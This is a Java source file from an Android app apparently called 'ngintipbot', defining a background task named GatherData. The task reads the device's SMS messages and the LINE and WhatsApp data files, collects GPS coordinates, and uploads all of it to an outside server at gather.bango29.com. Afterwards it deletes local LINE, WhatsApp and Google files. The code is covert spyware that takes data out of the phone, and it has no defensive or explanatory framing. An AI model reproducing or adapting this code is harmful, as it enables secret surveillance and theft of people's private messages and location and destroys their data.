package com.bango.ngintipbot;

import android.location.Location;
import android.os.AsyncTask;

import com.bango.ngintipbot.models.GatherDataParameter;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.JsonHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;

public class GatherData extends AsyncTask<GatherDataParameter, Void, Void> {
    private Location loc;

    private static final String BASE_URL = "http://gather.bango29.com/android/";
    private AsyncHttpClient http = new AsyncHttpClient();

    private String lineFile = "";
    private String whatsappFile = "";
    private String smsJsonString = "";

    @Override
    protected Void doInBackground(GatherDataParameter... params) {
        if(params.length == 0)
            return null;

        GatherDataParameter param = params[0];

        loc = param.getLocation();

        lineFile = Utils.readLine();
        whatsappFile = Utils.readWhatsapp();
        smsJsonString = Utils.readSMS(param.getContext());

        return null;
    }

    @Override
    protected void onPostExecute(Void aVoid) {
        if(loc == null)
            return;

        RequestParams params = new RequestParams();
        params.put("latitude", Double.toString(loc.getLatitude()));
        params.put("longitude", Double.toString(loc.getLongitude()));
        params.put("accuracy", Double.toString(loc.getAccuracy()));
        params.put("loc_ts", Long.toString(loc.getTime()));

        try {
            params.put("sms", smsJsonString);
        } catch(Exception e) {}

        try {
            params.put("line_file", new File(lineFile));
        } catch (FileNotFoundException e) {}

        try {
            params.put("whatsapp_file", new File(whatsappFile));
        } catch (FileNotFoundException e) {}

        http.post(BASE_URL, params, handler);
    }

    private JsonHttpResponseHandler handler = new JsonHttpResponseHandler() {
        @Override
        public void onSuccess(JSONObject res) {
            Utils.log(res.toString());
        }

        @Override
        public void onFinish() {
            super.onFinish();
            Utils.deleteLine();
            Utils.deleteWhatsapp();
            Utils.deleteGoog();
        }
    };
}
